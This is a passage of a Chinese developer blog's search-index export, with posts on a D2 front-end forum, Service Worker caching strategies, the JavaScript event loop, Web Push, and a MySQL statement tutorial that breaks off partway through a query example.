    <url>%2F2019%2F12%2F19%2FWeb%E5%89%8D%E7%AB%AF%2F14%20%E5%B1%8A%20D2%20%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF%E8%AE%BA%E5%9D%9B%E6%9C%89%E6%84%9F%2F</url>
    <content type="text"><![CDATA[托老板福偶得D2门票一张，周末有幸参加了第 14 届 D2 前端技术论坛，整体体验非常棒。前端是一个入门门槛极低，而天花板极高的行业，重复机械地“糊页面”已经远远不能满足骚动的技术内心，我们渴望成长，寻求突破，姑且跟随D2 前端论坛来看深水区前端的自我救赎。 TensorFlow 9012 年了算法推荐已深入人心，“猜你喜欢”也让人变得越来越喜欢。随着 tensorFlow.js 不断完善，模型越来越丰富，同时也支持 python 模型转换，前端智能正在成为一个炙手可热的话题。印象最深的是其中一个欧莱雅基于 tensorFlow.js 模型的口红试装小程序，目前自己也在做一些“端智能”相关用户行为实时推荐的事情，但主要还依赖端上 sdk 跑 python 模型，在支付宝等端外 h5 场景没有端 sdk 的加持，同样依赖前端智能借助 tensorFlow.js 在本地消费模型，后续我们也会在这块重点跟进。 微前端蚂蚁金服的有知分享了”标准微前端架构在蚂蚁的落地实践” ，主要内容参见“可能是你见过最完善的微前端解决方案”。目前已有非常多的”微前端”方案，社区的 single-spa，蚂蚁的 qiankun （基于 single-spa），飞冰的 icestark （“ICE 在微前端的探索”）等，但殊途同归，个人认为微前端本质解决的问题：如何解构巨石应用，方案上做到技术栈无关，使用上做到 iframe 一样简单又解决 iframe 的各种体验问题。个人也期待在所负责业务的中后台应用中实践 qiankun 微前端方案，不实践无真理。 引用有知的一段话（出自：微前端的核心价值）总结： 微前端首先解决的，是如何解构巨石应用，从而解决巨石应用随着技术更迭、产品升级、人员流动带来的工程上的问题。解构之后还需要再重组，重组的过程中我们就会碰到各种 隔离性、依赖去重、通信、应用编排 等问题。在解决了这些问题之后，才是产品的自由组合、widget 输出等能力。同时由于有了前者能力的铺垫和加持，这些产品上的价值提升也就变得很自然和容易。 IOT 近几年物联网的呼声很高，万物互联的理想正在一步一步照进现实，前端手握无所不能的 JavaScript 素有开发效率奇高的功效，在 Iot 领域也正攻城略地。不过前端真的要想抓住 Iot 的契机并不容易，个人认为，我们需要拓展的知识面较多，受限设备底层由嵌入式 c、c++ 代码无可避免、受限设备端容器技术优化等等，无不冲击着现有前端技术栈，仅仅手握 JavaScript 还远远不够。 整体感受：偷得浮生半日闲，看深水前端百家争鸣，吾辈共勉。即使日常工作低微而繁琐，不要放弃学习和及时充电，跟上时代的潮流才能永不落伍。 参考文档 ICE 在微前端的探索 可能是你见过最完善的微前端解决方案]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Service Worker最佳实践]]></title>
    <url>%2F2019%2F12%2F04%2FWeb%E5%89%8D%E7%AB%AF%2FService%20Worker%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[转载自 TBS 腾讯浏览服务，原文链接：https://x5.tencent.com/tbs/guide/serviceworker.html 1 Service Worker介绍Service Worker是一项比较新的Web技术，是Chromium团队在吸收了ChromePackaged App的Event Page机制，同时吸取了HTML5 AppCache标准失败的教训之后，提出一套新的W3C规范，旨在提高WebApp的离线缓存能力，缩小WebApp与NativeApp之间差距。 Service Worker从英文翻译过来就是一个服务工人，服务于前端页面的后台线程，基于Web Worker实现。有着独立的Javascript运行环境，分担、协助前端页面完成前端开发者分配的需要在后台悄悄执行的任务。基于它可以实现拦截和处理网络请求、消息推送、静默更新、事件同步等服务。 X5内核作为WebView提供给不同app使用，具备Service Worker网络拦截和处理网络请求，配合CacheStorage可以实现web页面的缓存管理以及与前端通过PostMessage通信。 2 Service Worker工作原理Service Worker技术核心是Service Worker脚本，它 是一种由Javascript编写的浏览器端代理脚本。 前端页面向内核发起注册时会将脚本地址通知内核，内核会启动独立进/线程加载Service Worker脚本并执行Service Worker安装及激活动作。成功激活后便进入空闲等待状态，若当前的Service Worker进/线程一直没有管辖的页面或者事件消息时会自动终止（具体的终止策略视不同浏览器及版本而定，不会影响前端编写逻辑，但前端勿在Service Worker脚本中保存需要持久化的信息，可以借助localstorage），当打开新的可管辖页面或者已管辖页面发起message等消息时，Service Worker进/线程会被重新唤起。 每当已安装的Service Worker有管辖页面被打开时，便会触发Service Worker脚本更新，当上次脚本更新写入Service Worker数据库的时间戳与本次更新超过24小时，便会忽略本地网络cache的Service Worker脚本直接从网络拉取。若网络拉取的与本地有一个字节的差异都会触发Service Worker脚本的更新，更新流程与安装类似，只是在更新安装成功后不会立即进入active状态，需要等待旧版本的Service Worker进/线程终止。 3 Service Worker开发调试方法有过使用chrome inspect前端页面调试经验对于Service Worker开发调试就很容易上手了，以 offline-page 为例： 使用pc chrome浏览器（最好是M53以后版本）打开上述页面后，按F12键进入inspect调试模式后 ​ 单击图2 inspect调试界面中的1及2后会出现当前页面域下的所有Service Worker，在单击6就会进入图3界面，这个时候调试Service Worker脚本就如调试前端页面js一样，可以随意在Service Worker脚本中下断点。如果在fetch监听事件中打上断点，当页面刷新或者页面中有其它请求时便会到达Service Worker线程，使得Service Worker脚本中的fetch事件执行被中断，这时可以将鼠标移动到fetch事件中的event上便可以看到是什么样的请求、请求的url等 。 对于一些较为复杂的页面，往往会有一部分资源使用本地cache，还有一部分仍然需要是时拉取，在调试过程中勾选图2中的3、4来快速达到当前tab页离线和跳过Service Worker拦截。 在之前的原理中说过，Service Worker会在每次打开对应的页面后去检查更新Service Worker脚本，但如果Service Worker脚本有缓存期限的话，那么在开发调试的时候修改了测试页面的Service Worker脚本并push到测试页面服务器上之后，刷新页面并不能立即去网络更新脚本，给开发调试带来麻烦，但图2中的5可以帮助开发强行忽略本地Service Worker脚本cache，实时的去网络更新。 Service Worker可以缓存资源，点击图2中的7便可以看到图4展示，表明了当前浏览器对当前页面的资源缓存情况，可以通过鼠标右键特定资源对资源进行删除操作。 最后我们可以通过在浏览器中输入chrome://serviceworker-internals来了解当前浏览器中所有已安装Service Worker的详细情况，Installation Status及Running Status展示当前Service Worker安装状态及运行状态，Version ID为其在当前数据库中的一个分配到的版本号，后续Service Worker脚本升级，版本号也会一起提升。 4 使用Service Worker进行资源缓存4.1 使用Service Worker进行简单的资源缓存还是以 offline-page 为例，前端在原来的web应用中使用Service Worker只需要三大步 1、切入到https；由于Service Worker可以劫持连接，伪造和过滤响应，所以保证其在传输过程中不被篡改非常重要。 2、在页面加载的恰当时机注册Service Worker；示例中在index页面的body onload事件中注册了同path下的service-worker.js作为index页面的服务线程脚本。 3、编写serviceworker脚本逻辑；serviceworker是事件驱动型服务线程，所以serviceworker脚本逻辑中基本都是以事件监听作为逻辑入口，示例中在serviceworker脚本被安装的install事件中缓存index页面主资源及子资源， 在激活事件activate监听事件中清除历史缓存，在这里需要注意的是caches.keys遍历的是当前域下所有的cache，可能同域下的其它path也使用了Service Worker进行资源缓存，直接如图所为，可能会误删除。 在fetch事件中，拦截前端页面发起的资源请求并到之前缓存的cache中匹配。其中加上容错处理，当发现缓存中无当前所要请求的资源时，折回网络请求。 4.2 深入了解Service Worker资源的几种缓存策略了解Service Worker资源的几种缓存策略是使用好Service Worker进行资源缓存的基础，实际应用场景会是几种缓存策略的集合。 4.2.1 不影响安装的资源预缓存 对于某些固定不变的静态资源，我们习惯在Service Worker初次安装的install事件中将其缓存，但资源过大或者网络不佳都会造成资源并未全部下载成功而导致Service Worker安装被中断，只有等下次用户在打开相应页面。这里可以将静态资源按优先级分为两类，一类是重要资源，一类是非重要资源，将重要资源放到安装等待队列中，非重要资源放到独立的队列中，这样只需要重要资源全部都加载成功就可以成功安装Service Worker了，可以提高Service Worker安装成功率。 offline-page-not-dependent-on-install 4.2.2 渐进式缓存 对于在install中发现没有缓存，页面又依赖但又不经常变化的资源，可以在页面打开或发生用户交互时触发fetch然后使用fetch api再去网络拉取，将返回正常的response缓存起来以便下次使用。 progressive-cache 4.2.3 仅使用缓存 在fetch事件中，仅去匹配资源，若匹配失败，表现出来的就是前端页面对于该 资源加载失败。这里容错性比较差，适合页面资源都是静态资源的，且不能使用不影响安装的资源预缓存。 cache-only 4.2.4 仅使用网络 在fetch事件中，仅将request重新抽出用fetch去网络加载并返回给前端页面。适用于资源大多是动态资源、实时性要求高的场景。 network-only 4.2.5 缓存优先 简单的资源缓存中使用的就是缓存优先策略，先去缓存匹配，匹配失败折回网络，这算是最常用、容错性能好的一种策略。 offline-page 4.2.6 网络优先 在fetch事件中先去网络fetch，当出现服务器故障或者网络不良时，折回本地缓存，目的是为了展示最新的数据，对实时性要求比较高但又能够带来良好体验的应用，比如天气类型应用。 network-first 4.2.7 速度优先 在fetch事件中同时发起本地缓存匹配及网络请求，谁先返回使用谁的，该方案适用于对性能要求比较高的站点，缩短了缓存优先策略中有可能缓存中没有资源再折回网络的时间消耗。 speed-first 4.3 Service Worker跨域资源的缓存策略Service Worker可以拦截它管辖范围内的基本所有请求，跨域资源也不例外。在普通的页面中，包含几个跨域脚本、图片等资源也太正常了。那么如何对这些跨域资源进行缓存呢？ 首先，浏览器默认对跨域资源发起的是ncors请求，也就是得到的response是opaque的，Service Worker是无法获得该response的status及url信息，以至于该response是否成功不得而知。如果对跨域资源能够发起cors请求，在跨域服务器允许的情况下，得到部分属性status及url可见的response，就可以判断出跨域请求是否成功，是否可以进行缓存以备下次使用了。朝着这个思想： 首先保证跨域的资源来自安全的https地址； 保证跨域资源服务器的response中Access-Control-Allow-Origin中包含当前的页面所在域或者为 *； 对于前端页面中的跨域资源的url可以附带“cors=1”参数，以便Service Worker在拦截之后可以判断出是跨域请求从而重新进行组装cors请求，如图17。 cross-resources 5 X5内核Service Worker功能扩展5.1 首次访问解决方案方案首次访问解决方案旨在用户访问业务前实现业务的资源缓存，让用户在第一次真正访问业务时能够让业务页面以最快的速度展示出来。针对该主旨，X5内核实现了三套具体实现方案： 5.1.1 离线包方式 离线包原理就是先在X5内核上模拟打开一次业务网址，然后将Service Worker中的cachestorage缓存、注册信息及脚本信息数据库进行打包内置到宿主中，当宿主首次安装时将离线包路径告知内核，内核会自动将离线包拷贝解压到内核目录。相当于用户跳过了首次访问安装Service Worker的过程。以QQ浏览器为例： 业务侧： 1、前端业务需要建立基于Service Worker业务，并且业务可以通过SW实现离线访问，在SW脚本的install方法中需要做资源的缓存。 2、可以通过QB6.8及以上版本访问swtool.qq.com，点击“离线包生成环境初始化”后重启浏览器，输入业务网址直到提示离线包已生成后退出浏览器，这时离线包已生成在/sdcard/tbs/com.tencent.mtt/out/Service Worker.zip。 3、关闭网络进入QQ浏览器，通过设置清除缓存文件后再将生成的离线包拷贝至/sdcard/tbs/com.tencent.mtt/Service Worker.zip位置并重新启动浏览器访问业务网址，如果业务可以正常打开，说明离线包OK。 4、若业务需要将离线包打进宿主apk，只要将离线包丢给宿主即可。 X5内核宿主侧： 1、若TBS宿主只有单个业务离线包打进apk，那么宿主需要在宿主apk首次安装并且在TBS内核初始化之前将业务离线包拷贝至/sdcard/tbs/{宿主包名}/Service Worker.zip即可，TBS启动时会自动搜索该路径。 2、若TBS宿主有多个单业务的离线包需要打进apk，可以由X5内核侧协助完成合并(后续会有自动化合并站点工具)，将多个单业务离线包合并成一个后再按照单业务的方式处理。 3、TBS宿主在发布前需要参考业务使用QB自检的方式自检业务是否可以离线打开。 5.1.2 X5内核后台云下发指令 1、前端业务需要建立基于Service Worker业务，并且业务可以通过SW实现离线访问，在SW脚本的install方法中需要做资源的缓存 2、需要将提前预置的业务网址及Service Worker脚本url及宿主包名同步给X5内核团队(目前接口负责人zhengyuli、yongling)，审核通过后随时可以上线。 5.1.3 X5内核扩展接口 使用TBS的宿主可以调用X5内核扩展接口webview.getX5WebViewExtension().registerServiceWorkerBackground(String url, String scriptUrl)来提前向内核注册某一特定页面的Service Worker。 5.2 两种静默更新方案对于一些更新比较频繁，实时性要求较高的业务，对更新能力需求也是相当亟需。一方面能让用户能够及时看到最新消息（Service Worker目前自带的更新能力只会发生在当前访问后，只有下次才能看到新更新的页面），另一方面能够缓解对业务服务器的并发访问，还能够缓解用户的网络慢导致进行业务更新时长时间等待。具体实现框架见图17。 5.2.1 TBS后台云下发指令 1、前端业务需要验证业务在更新Service Worker脚本后是否可以正常访问 2、需要将提前预置的业务网址及Service Worker脚本url及宿主包名和更新时间间隔同步给X5内核团队(目前接口负责人zhengyuli、yongling)，审核通过后随时可以上线。 5.2.2 TBS webview扩展接口 使用TBS的宿主可以调用X5内核扩展接口webview.getX5WebViewExtension().updateServiceWorkerBackground(String url)来提前向内核申请更新特定业务的Service Worker(注意这里需要业务已经在内核中安装过Service Worker，切此接口调用一次只会强制更新一次)。 6 X5内核基于Service Worker离线场景加载优化通常app在使用webview时，为了提升展示页面的速度，一般都会使用webview的shouldInterceptRequest来拦截webview的资源请求，然后将本地的资源校验后丢给webview处理。因为shouldInterceptRequest从内核通知到app，需要统一在File线程中排队并经历好几个线程的中转到达app，对于资源并发请求较少的页面来说，这种瓶颈可能并不明显，对于页面较复杂并发请求较多的页面来说，首屏加载完成的时间并不能像打开本地页面那样“秒开”。 X5内核借鉴Service Worker原理，允许app提前将业务的资源放入到内核缓存，当业务被访问时，会先访问本地cache，有就直接返回给内核，没有就跳过shouldInterceptRequest直接去网络加载，来屏蔽shouldInterceptRequest性能瓶颈。在手机QQ上的个别业务上有首屏性能有25%左右的提升。 使用TBS的宿主在空闲时间（不要在打开业务的时候，转入内核缓存需要消耗资源）可以调用X5内核扩展接口 webview.getX5WebViewExtension().registerServiceWorkerOffline(String url, List paths, boolean deleteAllCacheBefore) 其中url为业务网址，paths为绝对缓存路径，如 https://host.com/path1/path2/img.png 需要建立//cache/host.com/path1/path2/img.png 这样的路径，并将//cache传入内核，因为是list，所以支持多个目录，比如//cache1、//cache2等。deleteAllCacheBefore 删除该业务之前也有缓存，因为在更新资源时也是调用同样的接口，所以可能会出现内核缓存的冗余。 另外可以调用webview.getX5WebViewExtension().clearServiceWorkerCache()[将会在TBS3.3上提供]来清除转入内核的缓存，包括注册信息，以便能够动态的恢复到之前的状态。]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Understanding JavaScript — Heap, Stack, Event-loops and Callback Queue]]></title>
    <url>%2F2019%2F11%2F24%2FWeb%E5%89%8D%E7%AB%AF%2FUnderstanding%20JavaScript%20%E2%80%94%20Heap%2C%20Stack%2C%20Event-loops%20and%20Callback%20Queue%2F</url>
    <content type="text"><![CDATA[转载自 https://medium.com/，原文链接：https://medium.com/javascript-in-plain-english/understanding-javascript-heap-stack-event-loops-and-callback-queue-6fdec3cfe32e JavaScript is a single thread language which makes it different from most of the languages. It is lack of multi-thread application’s abilities whereas it does not have to deal with complex problems such as deadlock or shared variable problems. Single thread?A single thread language will be lack of having concurrent processes running at the same time. That means, if you have a process which takes long time, then it will block other processes to run. For that reason, there is a timeout defined in browsers which waits for response of process. When the process does not response in that timeout, you will see a popup which asks you to kill process or not. Do not run any business that will take long time on browser for not to block other functions. So, How JavaScript simulate like it’s running our commands in a multi-thread environment? To answer this question let’s deep into how JavaScript environment. JavaScript environment Although JavaScript is a single thread language, we have a strong helper which is browser that has ability to manage complex operations. Web API, Callback Queue and Event Loop mechanisms are part of browsers. Let’s dig into some details of each part. HeapHeap is the place (memory) where objects are stored when we define variables. StackStacks holds our function calls. On each new function call, it’s pushed on top of the stack. You can see your stack when you have an exception on JavaScript by stack trace. Web APIBrowsers have defined API’s which developers can be used to make complex processes such as to get location of visitor, GeoLocation is defined. A list of APIs are defined in the link which you can find in references (1). Callback QueueWhen a process finished its job, such as a xhr call, it’s dropped in a callback queue. Callback queue is triggered by event loop process after our stack is empty which means the process waits in that queue until our stack is empty. Once our stack has no function call, then a process is popped-out from callback queue and pushed in to stack. Event Loop A process which is responsible to check our stack and then trigger our callback queue continuously. Example What’s the expected output of above example? It starts with a console.log then continue with a setTimeout function which we wanted to run immediately(?) by giving a “0” timeout then another console.log. setTimeout is something special. It’s not defined in ECMAScript specification. It is a Web API (2). It works asynchronously. The given timeout does not guarantee that function will work after the given time but guarantees that it will wait at least given time. So setTimeout(fn,0) will not start immediately but it will wait at least zero millisecond. Let’s explain how it will behave when we run above code snippet. our first console.log(“Murat”) will be pushed to stack because we are making a function call. The variable will be saved in heap (memory) Because it’s not a async call, it’ll output given parameter First console.log function will be removed from stack, and heap will be empty setTimeout function will be called. So it’ll be pushed to stack It’s a async function and is a Web API function. It’ll be pushed to Web API box and setTimeout function will be removed from stack A timer in the background will be started to wait at least given amount of time to setTimeout. console.log(“Yusuf”) will be called and it’ll be pushed to stack and Yusuf will be stored in heap. It will output Yusuf. But at the same time, our event loop will continue checking stack’s status. After output of Yusuf, it’ll be removed from stack and heap. When the timer be sured that it’s waited at least given time, it’ll be pushed to callback queue (console.log(“Fatih”)) Our event loop will trigger callback queue when the stack gets empty. Next, console.log(“Fatih”) will be put to stack So, our output will be in the order of “Murat”, “Yusuf”, “Fatih” References Web API list, https://developer.mozilla.org/en-US/docs/Web/API setTimeout specification, https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web Push]]></title>
    <url>%2F2019%2F11%2F19%2FWeb%E5%89%8D%E7%AB%AF%2FWeb%20Push%2F</url>
    <content type="text"><![CDATA[什么是 Web Push目前大部分浏览器已经支持 Notification API，但 Web Notification 要求用户必须在线打开 Web Page。那么如何在网页关闭情况下继续发送 Web Notification 呢，那么答案就是我们今天要介绍的基于 Service Worker 和 Push API 的 Web Push 技术。 实现细节 用户授权：向用户请求用于接收消息推送的权限。 注册 Service Worker：页面向浏览器注册一个ServiceWorker，浏览器生成对应 ServiceWorkerRegistration对象。 订阅消息：页面通过 ServiceWorker 的 PushManager.subscribe 方法向 push service（FCM）订阅消息，FCM 返回 push subscription 给浏览器，浏览器找到对应的 ServiceWorker，并把 push subscription 回传给ServiceWorker。 在订阅一个用户之前，需要采用 VAPID 协议生成一套应用服务器密钥，也被称为 VAPID 密钥，对于每个请求 Push Service 的 Web 应用服务器来说是独一无二的，Push Service 根据 VAPID 来定位哪个 Web 应用服务器触发了推送消息给哪个用户。 上报 push subscription ：页面获取到 push subscription 通过 Ajax 将它发送给 Web 应用服务器。 12345678&#123; &quot;endpoint&quot;: &quot;https://random-push-service.com/some-kind-of-unique-id-1234/v2/&quot;, &quot;keys&quot;: &#123; &quot;p256dh&quot; :&quot;BNcRdreALRFXTkOOUHK1EtK2wtaz5Ry4YfYCA_0QTpQtUbVlUls0VJXg7A8u-Ts1XbjhazAkj7I99e8QcYP7DkM=&quot;, &quot;auth&quot; : &quot;tBHItJI5svbpez7KI4CCXg==&quot; &#125;&#125; 推送消息：Web 应用服务器需要推送消息时，将 push message 和 push subscription 发送给 push service（FCM）。 通知：FCM 根据 push subscription 找到对应的浏览器客户端并把消息推送给它，浏览器唤醒相应的 ServiceWorker 并触发 push 事件，通知用户。 取消订阅：页面在不再需要订阅消息时，可以发送 Ajax 请求通知 Web 应用服务器去清除 push subscription 并调用 PushSubscription.unsubscribe 向 push service 去取消订阅。 体验一把我们从 https://github.com/uestc66/web-push-codelab 上 clone 代码，按文档指示步骤操作模拟一个 Web Push 的基本流程： 实现门槛 Service Worker：为了做到在网页关闭的情况下，还能继续发送 Notification，必须使用驻留进程，而现在 Web 驻留进程就是现在正在大力普及的 Service Worker（chrome 下打开： chrome://serviceworker-internals 查看）。 浏览器必须支持 Push API 及 Notification API。目前大部分用户浏览器是基于 Chrome 内核， API 支持度还算可以。 HTTPS：出于安全方面的考虑，Service Worker 只能跑在 HTTPS 页面。目前大部分网站已经是 HTTPS 的了，这个问题不大。 浏览器客户端和 Web 应用服务器都必须能够访问 Google Service。Push Service 的默认实现是 Google 的 FCM/GCM （查看 chrome://gcm-internals/），而目前大部分国内网络环境无法访问 Chrome 的 FCM 推送服务，所以在不翻墙的网络环境下浏览器无法完成消息订阅和推送。 浏览器自建 push service 对于服务器的软硬件成本不小，推送服务商倒是可以考虑为浏览器厂商提供支持标准的 Web Push Protocol 的有影响力的推送服务，类似 Google 的 FCM/GCM。 如果Web Push一直得不到支持，对于浏览器SDK来说，可以提供一套非标准的API，允许客户端（比如，手淘）推送消息给浏览器的ServiceWorker，push service则由使用浏览器SDK的客户端自行去实现。 基于三方的推送工具来实现，如：onesignal。 FAQPush &amp;&amp; Notification可以理解为就是 Push Servicer 和 ServiceWorker 之间，ServiceWorker 和 Web Page 之间的消息通信。 Push: Push Servicer 将更新的信息传递给 ServiceWorker Notification: ServiceWorker 将更新的信息推送给用户 对比 Ajax 轮询、Http 长连接、WebSocket Ajax 轮询是通过客户端不断向服务端发送 Http 请求，若有新消息就取回的模式保持数据实时更新，但这种方式需要服务器有很快的处理速度和资源。 Http 长连接是客户端向服务器发送请求后，若服务器没有新数据要发送，就不返回 response，一旦有了新数据返回了response，客户端就立刻再发一个 request，周而复始。事实上这是把 http 协议的不对称性从客户端转移到了服务端。 WebSocket 是 HTML5 中提出的一个新标准，客户端在发送请求时在请求头加入额外的字段，以标识这是一个基于 WebSocket 协议的连接，服务器根据这个请求头生成响应，与客户端建立起 WebSocket 连接，之后服务端有新消息时，直接向客户端推送即可。 综上，Ajax 轮询、Http 长连接、WebSocket 都依赖页面与服务器的连接，一旦页面或者浏览器关闭，连接也就关了，而 Web Push 基于 Service Worker 即使页面或者浏览器关闭，当消息到达时，也能被唤醒并显示消息。 国内哪些站点实现了 Web Push AliExpress，Alibaba.com 作为 FCM launch 的合作伙伴，完成了 H5 消息推送的落地。 https://m.aliexpress.com/ https://www.alibaba.com/ 参考文档 google 官方文档 web-push实现原理及细节介绍]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F10%2F15%2FSQL%2F%E5%AE%9E%E7%94%A8%20SQL%20%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[实用 SQL 语句前言文章沿着设计一个假想的应用 awesome_app 为主线，从零创建修改数据库，表格，字段属性，索引，字符集，默认值，自增，增删改查，多表查询，内置函数等实用 SQL 语句。收藏此文，告别零散又低效地搜索经常使用的 SQL 语句。所有 SQL 都在 MySQL 下通过验证，可留着日后回顾参考，也可跟着动手一起做，如果未安装 MySQL 可参考 《macOS 安装 mysql》 (windows 安装大同小异)。 1. 创建1.1 创建数据库语法：create database db_name 示例：创建应用数据库 awesome_app 1create database `awesome_app` 1.2 创建表格语法：create table table_name ( … columns ) 示例：创建用户表 users 1234567create table `users`( `id` int, `name` char(10), `avatar` varchar(300), `regtime` date) 1.3 创建索引语法：create index index_name on table_name (column_name) 示例：为用户 id 创建索引 idx_id 123create index `idx_id` on `users` (`id`)/* 创建唯一索引 */create unique index `idx_id` on `users` (`id`) 1.4 为已存在的列创建主键 更常用的方式是在创建表语句所有列定义的后面添加一行 primary key (column_name)。 语法：alter table table_name add primary key (column_name) 示例：将用户 id 设为主键 1alter table users add primary key (`id`) 1.5 为已存在的列创建自增约束 更常用的方式是在创建表语句中添加自增列 id int not null auto_increment。 1alter table `users` modify `id` int not null auto_increment 2. 插入语法： insert into table_name values (value1, value2, …) insert into table_name (column1, column2, …) values (value1, value2, …) 示例：新增注册用户 123insert into `users` values (1, &apos;ken&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/avatar1.jpg&apos;, curdate())/* 指定列插入 */insert into `users` (`name`, `avatar`) values (&apos;bill&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg&apos;) 3. 修改3.1 修改数据记录语法： update table_name set column=new_value where condition update table_name set column1=new_value1,column2=new_value2,… where condition 示例： 123update `users` set `regtime`=curdate() where `regtime` is null/* 一次修改多列 */update `users` set `name`=&apos;steven&apos;,`avatar`=&apos;http://cdn.awesome_app.com/path/to/xxx/steven.jpg&apos; where `id`=1 3.2 修改数据库字符集为 utf81alter database `awesome_app` default character set utf8 3.3 修改表字符集为 utf81alter table `users` convert to character set utf8 3.4 修改表字段字符集为 utf81alter table `users` modify `name` char(10) character set utf8 3.5 修改字段类型1alter table `users` modify `regtime` datetime not null 3.5 修改字段默认值123alter table `users` alter `regtime` set default &apos;2019-10-12 00:00:00&apos;/* 设置默认为当前时间 current_timestamp，需要重新定义整个列 */alter table `users` modify `regtime` datetime not null default current_timestamp 4. 删除4.1 删除数据记录语法：delete from table_name where condition 示例：删除用户名未填写的用户 12345678910111213141516171819# 先增加一条用户名为空的用户mysql&gt; insert into `users` (`regtime`) values (curdate());mysql&gt; select * from users;+----+--------+----------------------------------------------------+------------+| id | name | avatar | regtime |+----+--------+----------------------------------------------------+------------+| 1 | steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg | 2019-10-12 || 2 | bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg | 2019-10-12 || 3 | NULL | NULL | 2019-10-12 |+----+--------+----------------------------------------------------+------------+# 删除用户名为空的行mysql&gt; delete from `users` where `name` is null;mysql&gt; select * from users;+----+--------+----------------------------------------------------+------------+| id | name | avatar | regtime |+----+--------+----------------------------------------------------+------------+| 1 | steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg | 2019-10-12 || 2 | bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg | 2019-10-12 |+----+--------+----------------------------------------------------+------------+ 4.2 删除数据库1drop database if exists `awesome_app` 4.3 删除表1drop table if exists `users` 4.4 清空表中所有数据这个操作相当于先 drop table 再 create table ，因此需要有 drop 权限。 1truncate table `users` 4.5 删除索引1drop index `idx_id` on `users` 5. 查询5.1 语法1234567891011121314151617181920212223SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [PARTITION partition_list] [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE &apos;file_name&apos; [CHARACTER SET charset_name] export_options | INTO DUMPFILE &apos;file_name&apos; | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] 5.2 单表查询5.2.1 准备数据：123456789101112131415insert into users (`name`, `avatar`) values(&apos;张三&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/3.jpg&apos;),(&apos;李四&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/4.jpg&apos;),(&apos;王五&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/5.jpg&apos;),(&apos;马六&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/6.jpg&apos;),(&apos;肖七&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/7.jpg&apos;),(&apos;刘八&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/8.jpg&apos;),(&apos;杨九&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/9.jpg&apos;),(&apos;郑十&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/10.jpg&apos;);/* 增加重复行 */insert into users (`name`, `avatar`) values(&apos;张三&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/3.jpg&apos;),(&apos;李四&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/4.jpg&apos;),(&apos;王五&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/5.jpg&apos;); 5.2.2 查询所有列123456789101112131415161718mysql&gt; select * from users;+----+--------+----------------------------------------------------+---------------------+| id | name | avatar | regtime |+----+--------+----------------------------------------------------+---------------------+| 1 | steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg | 2019-10-12 00:00:00 || 2 | bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg | 2019-10-12 00:00:00 || 3 | 张三 | http://cdn.awesome_app.com/path/to/xxx/3.jpg | 2019-10-13 10:58:37 || 4 | 李四 | http://cdn.awesome_app.com/path/to/xxx/4.jpg | 2019-10-13 10:58:37 || 5 | 王五 | http://cdn.awesome_app.com/path/to/xxx/5.jpg | 2019-10-13 10:58:37 || 6 | 马六 | http://cdn.awesome_app.com/path/to/xxx/6.jpg | 2019-10-13 10:58:37 || 7 | 肖七 | http://cdn.awesome_app.com/path/to/xxx/7.jpg | 2019-10-13 10:58:37 || 8 | 刘八 | http://cdn.awesome_app.com/path/to/xxx/8.jpg | 2019-10-13 10:58:37 || 9 | 杨九 | http://cdn.awesome_app.com/path/to/xxx/9.jpg | 2019-10-13 10:58:37 || 10 | 郑十 | http://cdn.awesome_app.com/path/to/xxx/10.jpg | 2019-10-13 10:58:37 || 11 | 张三 | http://cdn.awesome_app.com/path/to/xxx/3.jpg | 2019-10-13 11:20:17 || 12 | 李四 | http://cdn.awesome_app.com/path/to/xxx/4.jpg | 2019-10-13 11:20:17 || 13 | 王五 | http://cdn.awesome_app.com/path/to/xxx/5.jpg | 2019-10-13 11:20:17 |+----+--------+----------------------------------------------------+---------------------+ 5.2.3 查询指定列123456789101112131415161718mysql&gt; select id,name from users;+----+--------+| id | name |+----+--------+| 1 | steven || 2 | bill || 3 | 张三 || 4 | 李四 || 5 | 王五 || 6 | 马六 || 7 | 肖七 || 8 | 